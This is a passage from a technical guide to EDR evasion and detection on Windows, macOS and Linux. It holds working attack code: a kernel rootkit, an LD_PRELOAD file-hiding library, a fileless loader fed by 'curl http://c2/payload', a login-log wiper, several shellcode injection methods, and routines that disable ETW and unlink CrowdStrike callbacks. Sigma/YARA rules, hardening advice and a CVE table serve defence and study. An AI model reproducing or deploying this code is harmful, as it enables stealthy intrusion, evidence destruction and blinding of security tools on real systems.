    //   prev_entry->d_reclen += cur_entry->d_reclen  (skip hidden entry)
    // Write back via bpf_probe_write_user. Bounded loop for BPF verifier.
    return 0;
}
char LICENSE[] SEC("license") = "GPL";
```

Load: `bpftool prog load hide_proc.bpf.o /sys/fs/bpf/hide_proc`. Detection: `bpftool prog list`. eBPF signing (kernel 5.19+) prevents unsigned programs.

### 3C.2 Kernel module rootkit — hiding from lsmod

Removes itself from the module linked list and sysfs, then hooks `sys_kill` for signal-based commands (Diamorphine pattern).

```c
#include <linux/module.h>
#include <linux/list.h>
static struct list_head *prev;

static void hide(void) {
    prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);          // hidden from lsmod / /proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj); // hidden from /sys/module/
}

typedef asmlinkage long (*kill_t)(pid_t, int);
static kill_t orig_kill;

static asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == 63) { hide(); return 0; }  // signal 63 = toggle visibility
    return orig_kill(pid, sig);
}

static int __init rk_init(void) {
    hide();
    // Locate sys_call_table (kallsyms / memory scan), disable CR0.WP, hook sys_kill
    return 0;
}
static void __exit rk_exit(void) { list_add(&THIS_MODULE->list, prev); }
module_init(rk_init); module_exit(rk_exit); MODULE_LICENSE("GPL");
```

Detection: LKRG detects syscall table modifications. `volatility3` enumerates hidden modules via kernel memory. `CONFIG_MODULE_SIG_FORCE` blocks unsigned modules.

### 3C.3 LD_PRELOAD hooking library

Intercepts libc functions via `dlsym(RTLD_NEXT, ...)`. Example: hide files by filtering `readdir`.

```c
// stealth.c — gcc -shared -fPIC -o stealth.so stealth.c -ldl
#define _GNU_SOURCE
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

#define HIDDEN_PREFIX ".implant"

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    do { e = real(dirp); if (!e) return NULL;
    } while (strncmp(e->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0);
    return e;
}
// Same pattern for connect(), accept(), stat(), open() — dlsym(RTLD_NEXT, "connect")
// and filter by port/address/path before calling the original.
```

Install: `echo /usr/local/lib/stealth.so >> /etc/ld.so.preload` (global) or `export LD_PRELOAD=...` (per-session). Detection: monitor `/etc/ld.so.preload` writes, check `LD_PRELOAD` in `/proc/PID/environ`.

### 3C.4 Fileless execution — memfd_create + fexecve

Complete C: read ELF from stdin (in practice from C2 socket), write to anonymous memfd, execute via `fexecve`. No disk artifact.

```c
// fileless_exec.c — gcc -o fileless_exec fileless_exec.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

int main(void) {
    unsigned char *buf = NULL;
    size_t sz = 0, cap = 4096;
    buf = malloc(cap);
    ssize_t n;
    unsigned char tmp[4096];
    while ((n = read(STDIN_FILENO, tmp, sizeof(tmp))) > 0) {
        if (sz + n > cap) { cap *= 2; buf = realloc(buf, cap); }
        memcpy(buf + sz, tmp, n); sz += n;
    }

    int fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
    if (fd < 0) { perror("memfd_create"); return 1; }
    write(fd, buf, sz);
    free(buf);

    char *argv[] = { "worker", NULL };
    char *envp[] = { NULL };
    fexecve(fd, argv, envp);
    perror("fexecve"); return 1;
}
```

Usage: `curl -s http://c2/payload | ./fileless_exec`. `/proc/PID/exe` → `/memfd: (deleted)`. Detection: auditd `-S memfd_create` + Falco rule from §3.2.

### 3C.5 Log tampering — utmp/wtmp/lastlog manipulation

These files use fixed-size `struct utmp` / `struct lastlog` records. Zeroing a record removes login evidence without breaking file format.

```c
// log_tamper.c — zero matching user records in utmp/wtmp/lastlog
#include <stdio.h>
#include <string.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>

void clean_utmp_wtmp(const char *path, const char *user) {
    FILE *f = fopen(path, "r+b"); if (!f) return;
    struct utmp e;
    while (fread(&e, sizeof(e), 1, f) == 1) {
        if (strncmp(e.ut_user, user, UT_NAMESIZE) == 0) {
            fseek(f, -(long)sizeof(e), SEEK_CUR);
            memset(&e, 0, sizeof(e));
            fwrite(&e, sizeof(e), 1, f);
        }
    }
    fclose(f);
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    clean_utmp_wtmp("/var/run/utmp", argv[1]);
    clean_utmp_wtmp("/var/log/wtmp", argv[1]);
    // lastlog: seek to uid * sizeof(struct lastlog), zero the record
    struct passwd *pw = getpwnam(argv[1]); if (!pw) return 1;
    FILE *f = fopen("/var/log/lastlog", "r+b"); if (!f) return 1;
    struct lastlog ll; memset(&ll, 0, sizeof(ll));
    fseek(f, pw->pw_uid * sizeof(ll), SEEK_SET);
    fwrite(&ll, sizeof(ll), 1, f); fclose(f);
    return 0;
}
```

Detection: FIM on `/var/run/utmp`, `/var/log/wtmp`, `/var/log/lastlog`. Auditd: `-w /var/log/wtmp -p wa -k log_tamper`. Cross-correlation: sshd journal entry with no matching utmp/wtmp record = tampering.

---

## 3D. Detection Engineering — All Platforms

### 3D.1 Windows Sigma rules

**ETW tampering via ntdll patch:**

```yaml
title: ETW EtwEventWrite Function Patched in Process Memory
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects EtwEventWrite prologue modification (ETW blinding). Requires EDR ntdll integrity checks.
logsource:
    product: windows
    category: image_tampering
detection:
    selection:
        TargetImage|endswith: '\ntdll.dll'
        TargetFunction: 'EtwEventWrite'
        EventType: 'CodeIntegrityViolation'
    condition: selection
falsepositives: [Debugging tools patching ETW]
level: critical
tags: [attack.defense_evasion, attack.t1562.001]
```

**AMSI bypass indicators:**

```yaml
title: AMSI Bypass via Memory Patching of amsi.dll
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: experimental
description: Detects VirtualProtect on amsi.dll .text section — AmsiScanBuffer patch indicator.
logsource:
    product: windows
    category: process_access
detection:
    selection:
        CallTrace|contains: 'amsi.dll'
        GrantedAccess|contains: ['0x1FFFFF', '0x001F0FFF']
    filter_legitimate:
        SourceImage|endswith: ['\MsMpEng.exe', '\MsSense.exe']
    condition: selection and not filter_legitimate
falsepositives: [AV/EDR updating AMSI hooks]
level: critical
tags: [attack.defense_evasion, attack.t1562.001]
```

**Direct syscall from non-system binary:**

```yaml
title: Direct Syscall from Unbacked Memory Region
id: c3d4e5f6-a7b8-9012-cdef-345678901234
status: experimental
description: Syscall from MEM_PRIVATE region — direct syscall bypassing ntdll hooks. Requires kernel stack-walk.
logsource:
    product: windows
    category: api_call
detection:
    selection:
        CallStack|contains: 'UNKNOWN'
        CallStackAllocation: 'MEM_PRIVATE'
        ApiCall|startswith: 'Nt'
    filter_jit:
        SourceImage|endswith: ['\java.exe', '\node.exe', '\chrome.exe', '\msedge.exe']
    condition: selection and not filter_jit
falsepositives: [JIT engines, legitimate direct syscall users]
level: high
tags: [attack.defense_evasion, attack.t1106]
```

### 3D.2 Windows YARA rules

**Syscall stub patterns in non-system PE:**

```yara
rule Syscall_Stub_In_NonSystem_PE {
    meta:
        description = "Embedded syscall stubs in unsigned PE"
        severity = "high"
        mitre = "T1106"
    strings:
        $stub = { 4C 8B D1 B8 ?? ?? 00 00 0F 05 C3 }   // mov r10,rcx; mov eax,SSN; syscall; ret
        $egg  = { 4C 8B D1 B8 [2] 00 00 [0-8] 0F 05 C3 } // SysWhispers3 egg-hunter
        $gate = { 4C 8B D1 B8 ?? ?? 00 00 F6 04 25 }     // Hell's Gate validation
    condition:
        uint16(0) == 0x5A4D and filesize < 10MB and not pe.is_signed and any of them
}

rule Sleep_Obfuscation_Ekko_Foliage {
    meta:
        description = "Ekko/Foliage sleep obfuscation API combination"
        severity = "high"
        mitre = "T1027.011"
    strings:
        $a1 = "RtlCreateTimerQueue" ascii
        $a2 = "SystemFunction032" ascii
        $a3 = "NtContinue" ascii
        $a4 = "RtlCreateTimer" ascii
        $a5 = "VirtualProtect" ascii
        $rc4 = { 33 C0 88 04 ?? 40 3D 00 01 00 00 }  // RC4 key schedule
    condition:
        uint16(0) == 0x5A4D and filesize < 5MB and 3 of ($a*) and $rc4
}
```

### 3D.3 macOS Sigma rules

**TCC.db modification by non-system process:**

```yaml
title: TCC Database Modified by Non-System Process
id: d4e5f6a7-b8c9-0123-defa-456789012345
status: experimental
description: Writes to TCC.db from non-tccd process — direct TCC bypass.
logsource:
    product: macos
    category: file_change
detection:
    selection:
        TargetFilename|endswith: 'com.apple.TCC/TCC.db'
        EventType: 'FileWrite'
    filter_legitimate:
        Image|endswith: ['/tccd', '/tccutil']
    condition: selection and not filter_legitimate
falsepositives: [MDM tools managing TCC permissions]
level: critical
tags: [attack.defense_evasion, attack.t1222]
```

**Unsigned dylib loaded in protected application path:**

```yaml
title: Unsigned Dylib Loaded from Application Frameworks Directory
id: e5f6a7b8-c9d0-1234-efab-567890123456
status: experimental
description: Unsigned dylib from Frameworks directory — dylib hijacking indicator.
logsource:
    product: macos
    category: image_load
detection:
    selection:
        ImageLoaded|contains: '/Contents/Frameworks/'
        ImageSigned: false
    filter_dev:
        Image|contains: '/Xcode'
    condition: selection and not filter_dev
falsepositives: [Developer builds with unsigned frameworks]
level: high
tags: [attack.persistence, attack.t1574.004]
```

### 3D.4 macOS YARA rule

**Dylib proxy pattern:**

```yara
rule Dylib_Proxy_Pattern {
    meta:
        description = "Dylib proxy: constructor + reexport load command"
        severity = "medium"
        mitre = "T1574.004"
    strings:
        $ctor     = "__mod_init_func" ascii
        $reexport = { 1F 00 00 80 }        // LC_REEXPORT_DYLIB (0x8000001F)
        $dlsym    = "RTLD_NEXT" ascii
    condition:
        (uint32(0) == 0xFEEDFACF or uint32(0) == 0xFEEDFACE) and
        $ctor and ($reexport or $dlsym) and filesize < 2MB
}
```

### 3D.5 Linux Sigma rules

**eBPF program loading by non-standard process:**

```yaml
title: eBPF Program Loaded by Non-Standard Process
id: f6a7b8c9-d0e1-2345-fabc-678901234567
status: experimental
description: bpf(BPF_PROG_LOAD) from non-allowlisted process — eBPF rootkit indicator.
logsource:
    product: linux
    category: syscall
detection:
    selection:
        syscall: 'bpf'
        a0: '5'   # BPF_PROG_LOAD
    filter_legitimate:
        exe|endswith: ['/bpftool', '/bpftrace', '/cilium-agent', '/systemd', '/falco']
    condition: selection and not filter_legitimate
falsepositives: [Custom eBPF monitoring tools, container runtime BPF programs]
level: high
tags: [attack.defense_evasion, attack.t1014]
```

**memfd_create + fexecve / execve from memfd:**

```yaml
title: Fileless Execution via memfd_create and fexecve
id: a7b8c9d0-e1f2-3456-abcd-789012345678
status: experimental
description: memfd_create + execve from /memfd or /proc/self/fd — fileless payload execution.
logsource:
    product: linux
    category: syscall
detection:
    selection_memfd:
        syscall: 'memfd_create'
    selection_exec:
        syscall: 'execve'
        a0|contains: ['/memfd:', '/proc/self/fd/']
    timeframe: 5s
    condition: selection_memfd | near selection_exec
falsepositives: [Legitimate memfd_create for shared memory — rare with execve]
level: critical
tags: [attack.defense_evasion, attack.t1620]
```

### 3D.6 Linux YARA rule

**LD_PRELOAD hooking library:**

```yara
rule LD_PRELOAD_Hooking_Library {
    meta:
        description = "ELF hooking libc via dlsym(RTLD_NEXT)"
        severity = "high"
        mitre = "T1574.006"
    strings:
        $dlsym = "dlsym" ascii
        $rtld = "RTLD_NEXT" ascii
        $f1 = "readdir" ascii
        $f2 = "getdents" ascii
        $f3 = "open" ascii
        $f4 = "connect" ascii
        $f5 = "accept" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1MB and
        $dlsym and $rtld and 2 of ($f*)
}
```

---

## 3E. EDR Hardening and Monitoring

### 3E.1 Windows hardening

- **PPL for EDR:** Run EDR as PPL (`PsProtectedSignerAntimalware-Light`). Blocks `PROCESS_ALL_ACCESS`, code injection, termination. Requires ELAM certificate.
- **Credential Guard:** LSASS isolated in Hyper-V VTL 1 — defeats credential dumping even at SYSTEM.
- **WDAC:** See §1.6. Block LOLBAS, enable DLL enforcement, use Microsoft recommended block rules.
- **ETW TI provider:** GUID `f4e1897c-bb5d-5668-f1d8-040f4d8dd344`. Monitors cross-process memory access, `NtSetContextThread`, `NtMapViewOfSection` on `\KnownDlls`. Requires PPL consumer. Survives user-mode ETW patching.
- **Sysmon key events:** 7 (ImageLoaded — ntdll double-mapping), 8 (CreateRemoteThread), 10 (ProcessAccess — VM_WRITE grants), 13 (RegistryEvent — AMSI COM hijack), 25 (ProcessTampering — hollowing/herpaderping).

### 3E.2 macOS hardening

- **SIP:** Protects system directories, kexts, protected processes. Verify: `csrutil status`. Must remain enabled.
- **SSV (Signed System Volume):** macOS 11+. Cryptographically sealed boot volume prevents system binary modification.
- **TCC hardening:** Audit FDA grants, restrict Accessibility to essentials, deploy MDM-managed TCC profiles.
- **ES entitlement:** `com.apple.developer.endpoint-security.client` required — Apple-granted only. Prevents unauthorized ES event subscription.

### 3E.3 Linux hardening

- **eBPF signing (5.19+):** `CONFIG_BPF_UNPRIV_DEFAULT_OFF=y` + `CONFIG_BPF_LSM=y`. Mandate signed BPF programs.
- **Lockdown LSM:** `lockdown=integrity` blocks unsigned modules, `/dev/mem` access, `kexec`, MSR writes, eBPF kernel writes. `lockdown=confidentiality` additionally blocks `/proc/kcore` and `perf_event_open`.
- **Module signing:** `CONFIG_MODULE_SIG_FORCE=y` + Secure Boot. Unsigned modules rejected.
- **IMA/EVM:** Runtime measurement list of loaded files. Enforce mode blocks files with invalid measurements. Effective against tampered binaries and unauthorized kernel modules.

### 3E.4 Hardening summary table

| Platform | Evasion | Detection | Hardening |
|----------|---------|-----------|-----------|
| Windows | ETW patch §1.4 | Kernel TI provider, ntdll integrity | PPL consumer, canary ETW |
| Windows | AMSI bypass §1.5 | Script Block Logging, amsi.dll hash | Remove .NET 2.0, WDAC CLM |
| Windows | NTDLL unhook §1.2 | Multi-ntdll mapping, .text hash | Kernel telemetry (not hook-only) |
| Windows | Direct syscall §1.3 | Kernel stack-walk, unbacked mem scan | Intel CET, HVCI |
| Windows | Sleep obfuscation §1.7 | Entropy scan, timer analysis | Periodic scan at timer completion |
| Windows | Callback removal §3A.5 | Driver load monitor | HVCI, Driver Blocklist |
| macOS | TCC bypass §2.2 | TCC.db write monitor | SIP, MDM TCC profiles |
| macOS | Dylib hijack §2.1 | Unsigned dylib detection | Library Validation, hardened runtime |
| macOS | ESF evasion §2.5 | Boot-time gap analysis | ES client early launch |
| Linux | eBPF rootkit §3.4 | bpftool, BPF syscall audit | BPF signing, lockdown LSM |
| Linux | Module rootkit §3.4 | LKRG, memory forensics | MODULE_SIG_FORCE, Secure Boot |
| Linux | LD_PRELOAD §3C.3 | ld.so.preload FIM, environ | RO /etc, integrity monitoring |
| Linux | Fileless exec §3.2 | auditd memfd_create, Falco | noexec tmpfs, restrict CAP_SYS_ADMIN |
| Linux | Log tamper §3C.5 | FIM wtmp/utmp, journal correlation | Append-only remote SIEM |

---

## 3F. CVE Reference Table

| CVE | Platform | Technique | Description | CVSS | Affected |
|-----|----------|-----------|-------------|------|----------|
| CVE-2021-31952 | Windows | ETW bypass | Win32k EoP → ETW provider manipulation | 7.8 | Win10 1809–21H1 |
| CVE-2020-0601 | Windows | Code signing bypass | CryptoAPI ECC cert spoofing ("CurveBall") | 8.1 | Win10, Server 2016/2019 |
| CVE-2022-37969 | Windows | PPL bypass | CLFS driver EoP → bypass PPL protections | 7.8 | Win10/11, Server 2008–2022 |
| CVE-2023-36874 | Windows | EDR bypass | WER service EoP → terminate/manipulate EDR | 7.8 | Win10/11, Server 2012–2022 |
| CVE-2024-21338 | Windows | Callback bypass | appid.sys IOCTL → kernel R/W → remove EDR callbacks | 7.8 | Win10/11, Server 2019/2022 |
| CVE-2023-32369 | macOS | TCC bypass | "Migraine" — mount point → TCC.db overwrite past SIP | 7.1 | Ventura < 13.4 |
| CVE-2024-44133 | macOS | TCC bypass | "HM Surf" — Safari entitlement abuse → cam/mic/location | 6.5 | Sonoma < 14.7 |
| CVE-2021-30713 | macOS | TCC bypass | Synthetic click → auto-approve TCC (XCSSET) | 7.8 | Big Sur < 11.4 |
| CVE-2022-22616 | macOS | Gatekeeper bypass | BOM manipulation skips quarantine check | 6.5 | Monterey < 12.3 |
| CVE-2023-41993 | macOS | ESF bypass | WebKit sandbox escape → bypass endpoint security | 9.8 | macOS, iOS, iPadOS |
| CVE-2021-3490 | Linux | eBPF verifier bypass | ALU32 bounds tracking → kernel R/W from unpriv eBPF | 7.8 | Kernel 5.7–5.11 |
| CVE-2022-0185 | Linux | Container escape | Filesystem context heap overflow → host kernel access | 8.4 | Kernel < 5.16.2 |
| CVE-2023-2008 | Linux | Module signing bypass | DMA-BUF ioctl overflow → kernel code exec | 7.8 | Kernel < 6.2.9 |
| CVE-2024-1086 | Linux | Kernel priv escalation | nf_tables UAF → root → rootkit installation | 7.8 | Kernel 3.15–6.7.1 |

**AMSI bypass note:** Most AMSI bypasses (patching, reflection) are technique-level, not CVE-tracked. Related CVEs include CVE-2018-0765 (.NET DoS triggering AMSI bypass) and CVE-2022-34718 (TCP/IP RCE chained with AMSI bypass). Microsoft mitigates via Defender signature updates.

---

## 4. Advanced EDR Bypass Techniques

Building on the foundational techniques in §1.2–§1.5 (unhooking, direct syscalls, ETW patching, AMSI bypass) and §3A.5 (callback enumeration), this section covers the next generation of evasion methods that emerged in 2023–2025 to defeat EDRs that adapted to the earlier tradecraft.

### 4.1 Hardware breakpoint syscall invocation

Hardware breakpoints (debug registers `DR0`–`DR3`) can trigger a Vectored Exception Handler (VEH) before a hooked API executes. The technique: set `DR0` to the address of the target `Nt*` function (e.g., `NtAllocateVirtualMemory`), set `DR7` to enable execution breakpoint on `DR0`, register a VEH. When the program calls the hooked function, the hardware breakpoint fires *before* the hook's `jmp` executes, transferring control to the VEH. The VEH reads the original SSN (from a resolved table), sets `EAX` to the SSN, sets `RIP` to a `syscall; ret` gadget in ntdll, clears the breakpoint, and returns `EXCEPTION_CONTINUE_EXECUTION`. The kernel executes the syscall from a legitimate ntdll address — the hook is never reached.

**Key advantage over direct syscalls:** The `syscall` instruction executes from within ntdll (legitimate image-backed memory), so kernel-side call-stack analysis sees a clean return address. No unbacked memory in the call chain.

**Key advantage over indirect syscalls:** No `jmp` gadget needed — the VEH naturally redirects execution through the exception dispatch mechanism, which is a legitimate OS code path.

```c
#include <windows.h>
#include <stdio.h>

// Resolved SSN table — populated via Halo's Gate (§1.3) at init
typedef struct { DWORD ssn; PVOID syscall_ret_addr; } SYSCALL_ENTRY;
static SYSCALL_ENTRY g_NtAllocateVirtualMemory;

LONG CALLBACK HwBpHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    // Check which DR triggered
    if (pExInfo->ContextRecord->Dr6 & 0x1) {  // DR0 hit
        pExInfo->ContextRecord->Rax = g_NtAllocateVirtualMemory.ssn;
        pExInfo->ContextRecord->R10 = pExInfo->ContextRecord->Rcx;
        pExInfo->ContextRecord->Rip = (DWORD64)g_NtAllocateVirtualMemory.syscall_ret_addr;
        // Clear DR0 + DR6 to avoid re-trigger
        pExInfo->ContextRecord->Dr0 = 0;
        pExInfo->ContextRecord->Dr6 = 0;
        pExInfo->ContextRecord->Dr7 &= ~0x1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL SetHwBreakpoint(PVOID targetAddr) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)targetAddr;
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;  // Enable DR0, execution breakpoint
    ctx.Dr6 = 0;
    return SetThreadContext(GetCurrentThread(), &ctx);
}

// Usage:
// AddVectoredExceptionHandler(1, HwBpHandler);
// SetHwBreakpoint(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"));
// NtAllocateVirtualMemory(...)  // → VEH intercepts → clean syscall from ntdll
```

**Detection.** ETW `Microsoft-Windows-Threat-Intelligence` reports `NtSetContextThread` modifying debug registers (`Dr0`–`Dr3`, `Dr7`). Sysmon Event ID 10 with `PROCESS_SET_INFORMATION` / `THREAD_SET_CONTEXT` — correlate with processes that subsequently perform sensitive operations (memory allocation, injection). Monitor `AddVectoredExceptionHandler` registrations from non-debugger processes.

### 4.2 Early bird APC injection

Standard APC injection requires the target thread to enter an alertable wait state. Early bird injection avoids this requirement by targeting a thread in its initialization phase — before the process entry point executes.

**Mechanism:**
1. Create target process in suspended state (`CREATE_SUSPENDED`)
2. Allocate memory in the target: `NtAllocateVirtualMemory`
3. Write shellcode: `NtWriteVirtualMemory`
4. Queue APC to the suspended main thread: `NtQueueApcThread(hThread, pShellcode, ...)`
5. Resume the thread: `NtResumeThread`

The APC executes before `ntdll!LdrInitializeThunk` completes its initialization — before the EDR's DLL is injected and hooks are placed. The shellcode runs in a pristine process environment.

```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

BOOL EarlyBirdInject(LPCSTR target, PBYTE shellcode, SIZE_T scSize) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return FALSE;

    PVOID remoteBase = NULL;
    SIZE_T regionSize = scSize;
    NtAllocateVirtualMemory(pi.hProcess, &remoteBase, 0,
                            &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    SIZE_T written;
    NtWriteVirtualMemory(pi.hProcess, remoteBase, shellcode, scSize, &written);

    pNtQueueApcThread NtQueueApc = (pNtQueueApcThread)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    NtQueueApc(pi.hThread, remoteBase, NULL, NULL, NULL);

    NtResumeThread(pi.hThread, NULL);
    return TRUE;
}
```

**Detection.** The sequence `CreateProcess(SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` → `ResumeThread` is a high-fidelity injection chain. Sysmon Event ID 8 (`CreateRemoteThread`) does not fire for APC injection — requires ETW `Microsoft-Windows-Threat-Intelligence` for `NtQueueApcThread` monitoring. Kernel callbacks: `PsSetCreateProcessNotifyRoutine` fires for the suspended process; correlate with immediate `NtQueueApcThread` before the process starts generating normal telemetry.

### 4.3 Thread name-based injection (Windows 11+)

Windows 10 1607 introduced `SetThreadDescription` (backed by `NtSetInformationThread` with `ThreadNameInformation`). The thread name is stored as a `UNICODE_STRING` allocated in the target process's address space. This creates a legitimate code path for cross-process memory allocation.

**Mechanism:**
1. Open a handle to a remote thread: `OpenThread(THREAD_SET_LIMITED_INFORMATION, ...)`
2. Call `SetThreadDescription(hThread, shellcode_as_wchar)` — the OS allocates memory in the remote process and writes the "name" (which is the shellcode)
3. The shellcode is now in the remote process's memory at a known address
4. Trigger execution via APC, thread hijacking, or `NtQueueApcThreadEx2`

**Key advantage:** No `VirtualAllocEx` or `WriteProcessMemory` calls — the memory allocation and write happen inside the kernel, bypassing the EDR hooks on these functions.

```c
#include <windows.h>
#include <processthreadsapi.h>

// Step 1: Locate writable target thread
HANDLE hThread = OpenThread(THREAD_SET_LIMITED_INFORMATION, FALSE, targetTid);

// Step 2: Write shellcode as "thread name" — kernel allocates in target process
// Shellcode must be valid UTF-16 (no null bytes in first scSize/2 WCHARs)
SetThreadDescription(hThread, (PCWSTR)encodedShellcode);

// Step 3: Read the allocation address
// NtQueryInformationThread(hThread, ThreadNameInformation, ...) returns the buffer addr
// Alternatively: scan the target's memory for the known shellcode signature

// Step 4: Trigger execution (APC, thread hijack, etc.)
```

**Limitations:** Shellcode must be valid UTF-16 (no embedded nulls in the wide-char stream), so encoding is required. The allocation is `PAGE_READWRITE` — an additional `NtProtectVirtualMemory` call is needed to make it executable, which re-exposes the operation to hooking.

**Detection.** Monitor `NtSetInformationThread` with `ThreadNameInformation` class where the calling process differs from the thread's owner. Correlate with subsequent `NtProtectVirtualMemory` calls changing the same region to `PAGE_EXECUTE_*`. Thread names > 1024 bytes are anomalous.

### 4.4 NtQueueApcThreadEx2 — special user APC injection

`NtQueueApcThreadEx2` (Windows 10 RS5+, undocumented) enables *special user APCs* that execute immediately without requiring the thread to enter an alertable wait. This is a fundamental advancement over `NtQueueApcThread` / `QueueUserAPC`.

```c
typedef NTSTATUS (NTAPI *pNtQueueApcThreadEx2)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle,  // NULL for non-reserved
    ULONG QueueFlags,             // QUEUE_USER_APC_SPECIAL_USER_APC = 1
    PVOID ApcRoutine,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3
);

// Resolve
pNtQueueApcThreadEx2 NtQueueApcThreadEx2 =
    (pNtQueueApcThreadEx2)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                          "NtQueueApcThreadEx2");

// Queue special user APC — executes immediately, no alertable wait needed
NTSTATUS status = NtQueueApcThreadEx2(
    hRemoteThread,
    NULL,                          // no reservation
    1,                             // QUEUE_USER_APC_SPECIAL_USER_APC
    remoteShellcodeAddr,           // APC routine = shellcode
    NULL, NULL, NULL
);
```

**Detection.** Kernel callback `PsSetCreateThreadNotifyRoutine` does not detect APC injection. The `Microsoft-Windows-Threat-Intelligence` ETW provider logs `NtQueueApcThreadEx` calls. Monitor for cross-process APC queuing where the APC routine address is in unbacked or recently-allocated memory. The combination of `NtQueueApcThreadEx2` with `QueueFlags = 1` from a cross-process context is a high-confidence injection indicator.

### 4.5 Kernel-level ETW provider disabling via BYOVD

User-mode ETW patching (§1.4) cannot disable kernel-protected providers like `Microsoft-Windows-Threat-Intelligence`. Attackers escalate: use a Bring Your Own Vulnerable Driver (BYOVD) to gain kernel read/write, then locate and disable ETW provider registration structures in kernel memory.

**Mechanism:**
1. Load a vulnerable signed driver (e.g., `RTCore64.sys` — CVE-2019-16098, `dbutil_2_3.sys` — CVE-2021-21551, `ene.sys`, `gdrv.sys`)
2. Use the driver's arbitrary read/write IOCTL to scan kernel memory for `_ETW_GUID_ENTRY` structures
3. Locate the `Microsoft-Windows-Threat-Intelligence` GUID (`f4e1897c-bb5d-5668-f1d8-040f4d8dd344`)
4. Zero the `ProviderEnableInfo` field or set `IsEnabled = 0` in the `_ETW_REG_ENTRY`
5. Optionally: walk the `_ETW_GUID_ENTRY.RegListHead` linked list and unlink all consumer registrations

```c
// Pseudocode — requires kernel read/write primitive from BYOVD
// Step 1: Locate EtwpGuidHashTable (kernel symbol, offset from ntoskrnl base)
PVOID pGuidHashTable = ntoskrnl_base + OFFSET_EtwpGuidHashTable;

// Step 2: Walk the hash table buckets
for (int bucket = 0; bucket < 64; bucket++) {
    PLIST_ENTRY head = &pGuidHashTable[bucket];
    for (PLIST_ENTRY entry = head->Flink; entry != head; entry = entry->Flink) {
        ETW_GUID_ENTRY *guidEntry = CONTAINING_RECORD(entry, ETW_GUID_ENTRY, GuidList);
        // Step 3: Match GUID
        if (IsEqualGUID(&guidEntry->Guid, &THREAT_INTEL_GUID)) {
            // Step 4: Disable
            guidEntry->ProviderEnableInfo.IsEnabled = 0;
            guidEntry->ProviderEnableInfo.Level = 0;
            guidEntry->ProviderEnableInfo.EnableProperty = 0;
        }
    }
}
```

**Real-world usage:** Lazarus Group (2024) used `ene.sys` BYOVD to disable CrowdStrike's kernel ETW consumers before deploying ransomware. BlackCat/ALPHV used `ktgn.sys` (CVE-2023-36802) for the same purpose.

**Detection.** Monitor driver loads for known vulnerable drivers — maintain a blocklist beyond Microsoft's `DriverSiPolicy.p7b`. HVCI blocks unsigned driver loads. `PsSetLoadImageNotifyRoutine` callback fires on driver load — EDR should hash the driver and check against blocklist before it executes. Post-load: monitor for ETW session modifications via `NtTraceControl` from kernel context. Canary ETW events (§1.4 hardening) detect provider disabling regardless of the method used.

### 4.6 ObRegisterCallbacks and CmRegisterCallback enumeration

Beyond the `PspNotifyRoutine` arrays covered in §3A.5, EDRs also register:

- **`ObRegisterCallbacks`** — Object callbacks that intercept `NtOpenProcess`, `NtOpenThread`, and handle duplication. EDRs use these to strip `PROCESS_VM_WRITE`, `PROCESS_CREATE_THREAD`, and other dangerous access rights from handles opened by untrusted processes.
- **`CmRegisterCallback` / `CmRegisterCallbackEx`** — Registry callbacks that monitor and optionally block registry operations (persistence detection, AMSI COM hijack detection).
- **Minifilter callbacks** — File-system minifilters that intercept I/O operations (write to `\System32\drivers\`, load from ADS, payload drops).

**Enumeration and removal (kernel R/W via BYOVD):**

```c
// Object callback removal — walk ObTypeInitializer.CallbackList
// for the Process and Thread object types
POBJECT_TYPE PsProcessType = *(POBJECT_TYPE*)nt_symbol("PsProcessType");
PCALLBACK_ENTRY_ITEM entry;
for (entry = PsProcessType->CallbackList.Flink;
     entry != &PsProcessType->CallbackList;
     entry = entry->EntryList.Flink) {
    if (IsInModuleRange(entry->PreOperation, "CrowdStrike.sys") ||
        IsInModuleRange(entry->PostOperation, "CrowdStrike.sys")) {
        // Unlink this callback entry
        entry->EntryList.Blink->Flink = entry->EntryList.Flink;
        entry->EntryList.Flink->Blink = entry->EntryList.Blink;
    }
}

// Registry callback removal — walk CmCallbackListHead
PLIST_ENTRY cmHead = (PLIST_ENTRY)nt_symbol("CallbackListHead");
for (PLIST_ENTRY e = cmHead->Flink; e != cmHead; e = e->Flink) {
